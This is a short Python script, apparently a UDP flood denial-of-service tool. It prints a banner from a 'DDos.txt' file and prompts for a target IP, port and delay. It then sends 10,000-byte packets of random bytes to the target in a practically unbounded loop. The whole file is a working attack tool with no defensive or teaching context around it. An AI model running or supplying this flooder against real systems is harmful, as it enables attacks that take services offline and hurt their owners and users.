import socket, random, time
vermelho = "\033[31m"
print(vermelho)
abrir= open('DDos.txt', 'r')
ler= abrir.read()
print(ler)

 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))
 
s.connect((ip, port))
 
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
    